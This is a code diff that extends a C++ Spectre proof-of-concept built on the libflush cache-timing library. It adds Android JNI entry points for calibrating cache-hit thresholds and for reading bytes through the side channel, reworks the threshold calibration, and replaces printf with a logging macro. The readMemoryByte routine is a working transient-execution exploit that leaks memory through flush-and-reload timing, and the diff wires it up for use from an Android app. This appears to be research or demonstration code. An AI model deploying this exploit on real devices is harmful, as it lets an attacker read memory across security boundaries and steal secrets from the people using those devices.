@@ -1,9 +1,18 @@
 #include <libflush.h>
-#include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
 #include <algorithm>
+
+#ifdef __ANDROID_API__
+#include "android_spectre_Spectre.h"
+#include <android/log.h>
+#define LOG(format, ...) __android_log_print(ANDROID_LOG_DEBUG, "libspectre", format, __VA_ARGS__)
+#else
+#include <stdio.h>
+#define LOG(format, ...) fprintf(stderr, format "\n", __VA_ARGS__)
+#endif
+
 
 /* FIXME: It's a mistery: Intel manual says cache width is 64 bytes, but it doesn't seem to work reliably with values smaller than 512 */
 #define BRANCH_PREDICT_TRAINING_COUNT 10
@@ -30,11 +39,15 @@ public:
       throw "Error: Could not initialize libflush";
     }
 
-    cache_hit_threshold = find_cache_hit_threshold();
+    find_cache_hit_threshold();
   }
 
   ~LibFlush() {
     libflush_terminate(session);
+  }
+
+  inline void access(void* ptr) {
+    return libflush_access_memory(ptr);
   }
 
   inline void flush(void* ptr) {
@@ -45,44 +58,43 @@ public:
     return libflush_reload_address(session, ptr);
   }
 
+  inline uint64_t flush_time(void* ptr) {
+    return libflush_flush_time(session, ptr);
+  }
+
   inline bool is_cache_hit(void* ptr) {
     return access_time(ptr) <= cache_hit_threshold;
   }
 
-  int find_cache_hit_threshold() {
-    const int test_count = 32;
+  int find_cache_hit_threshold(const int test_count = 256, int *sample_hits=nullptr, int sample_hits_length=0, int *sample_miss=nullptr, int sample_miss_length=0) {
     int hit_times[test_count];
     int miss_times[test_count];
 
     static uint8_t ALIGN_CACHE flush_benchmark[CACHE_LINE_SIZE];
 
     for (int i=0; i<test_count; i++) {
-        flush(&flush_benchmark);
-        miss_times[i] = access_time(&flush_benchmark);
-        hit_times[i] = access_time(&flush_benchmark);
+      flush(&flush_benchmark);
+      miss_times[i] = access_time(&flush_benchmark);
+      hit_times[i]  = access_time(&flush_benchmark);
     }
 
     std::sort(hit_times, hit_times+test_count);
     std::sort(miss_times, miss_times+test_count);
 
-    printf("var hit_times = [");
-    for (int i=0; i<=10; i++) {
-        if (i) printf(", ");
-        printf("%d", hit_times[i*(test_count-1) / 10]);
+    if (sample_hits) {
+      for (int i=0; i<sample_hits_length; i++) {
+        sample_hits[i] = hit_times[(test_count-1) *  i / (sample_hits_length-1)];
+      }
     }
-    printf("];\n");
-
-    printf("var miss_times = [");
-    for (int i=0; i<=10; i++) {
-        if (i) printf(", ");
-        printf("%d", miss_times[i*(test_count-1) / 10]);
+    if (sample_miss) {
+      for (int i=0; i<sample_miss_length; i++) {
+        sample_miss[i] = miss_times[(test_count - 1) * i / (sample_miss_length - 1)];
+      }
     }
-    printf("];\n");
 
-
-    int threshold = (hit_times[(int)(0.95*(test_count-1))] + miss_times[(int)(0.05*(test_count-1))]) / 2;
-    printf("Cache threshold: %d\n", threshold);
-    return threshold;
+    this->cache_hit_threshold = (hit_times[(int)(0.9*(test_count-1))] + miss_times[(int)(0.1*(test_count-1))]) / 2;
+    LOG("Cache threshold: %d", this->cache_hit_threshold);
+    return this->cache_hit_threshold;
   }
 };
 
@@ -100,8 +112,6 @@ public:
     /* Initialize with zeros to ensure that is not on a copy-on-write zero pages */
     memset(&array2, 0, sizeof(array2));
     memset(&array1, 0, sizeof(array1));
-    memset(&array1_size, 0, sizeof(array1_size));
-
     array1_size = sizeof(array1);
   }
 
@@ -170,15 +180,17 @@ public:
     for (const char* ptr = (const char*)target_ptr; ptr < (const char*)target_ptr + target_len; ptr++) {
       uint8_t value[2];
       int score[2];
-
-      printf("Reading at %p... ", ptr);
       readMemoryByte(ptr, value, score);
-      printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-      printf("0x%02X=’%c’ score=%d ", value[0],
-        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+
+      LOG(
+        "Reading at %p... %s: 0x%02X='%c', score=%d",
+        ptr,
+        (score[0] >= 2 * score[1] ? "Success" : "Unclear"),
+        value[0],
+        value[0] > 31 && value[0] < 127 ? value[0] : '?',
+        score[0]);
       if (score[1] > 0)
-        printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-      printf("\n");
+        LOG("(second best: 0x%02X score=%d)", value[1], score[1]);
     }
   }
 } ALIGN_CACHE;
@@ -189,11 +201,59 @@ LibFlush libflush(COUNTER_THREAD_CPU);
 Spectre spectre(libflush);
 
 
+#ifdef __ANDROID_API__
+jint Java_android_spectre_Spectre_calibrateTiming(JNIEnv *env, jclass cls, jint count, jintArray jhit_times, jintArray jmiss_times) {
+    int *hit_times = nullptr, *miss_times = nullptr;
+    int hit_times_len = 0, miss_times_len = 0;
+
+    if (jhit_times) {
+        hit_times = env->GetIntArrayElements(jhit_times, nullptr);
+        hit_times_len = env->GetArrayLength(jhit_times);
+    }
+    if (jmiss_times) {
+        miss_times = env->GetIntArrayElements(jmiss_times, nullptr);
+        miss_times_len = env->GetArrayLength(jmiss_times);
+    }
+
+    jint ret = libflush.find_cache_hit_threshold(count, hit_times, hit_times_len, miss_times, miss_times_len);
+
+    if (hit_times) {
+        env->ReleaseIntArrayElements(jhit_times, hit_times, 0);
+    }
+    if (miss_times) {
+        env->ReleaseIntArrayElements(jmiss_times, miss_times, 0);
+    }
+    return ret;
+}
+
+
+JNIEXPORT void JNICALL Java_android_spectre_Spectre_read (JNIEnv *env, jclass cls, jbyteArray jdata, jobject resultCallback) {
+    if (jdata == nullptr || resultCallback == nullptr) {
+        return;
+    }
+
+    jclass callbackCls = env->GetObjectClass(resultCallback);
+    jmethodID callbackMethod = env->GetMethodID(callbackCls, "onByte", "(IJBIBI)V");
+
+    jsize len = env->GetArrayLength(jdata);
+    jbyte* data = env->GetByteArrayElements(jdata, nullptr);
+    if (data != NULL) {
+        for (int i=0; i<len; i++) {
+            uint8_t value[2];
+            int score[2];
+            spectre.readMemoryByte(data+i, value, score);
+
+            env->CallVoidMethod(resultCallback, callbackMethod, i, (jlong)data+i, (jbyte)value[0], score[0], (jbyte)value[1], score[1]);
+        }
+    }
+}
+
+#else
 
 
 int main(int argc, const char** argv) {
   // Read CLI arguments: data pointer and lenght
-  const char* target_ptr = "The Magic Words are Squeamish Ossifrage.";
+  const char* target_ptr = "Mary had a little lamb";
   int target_len = strlen(target_ptr);
 
   if (argc == 3) {
@@ -210,3 +270,4 @@ int main(int argc, const char** argv) {
 
   return (0);
 }
+#endif
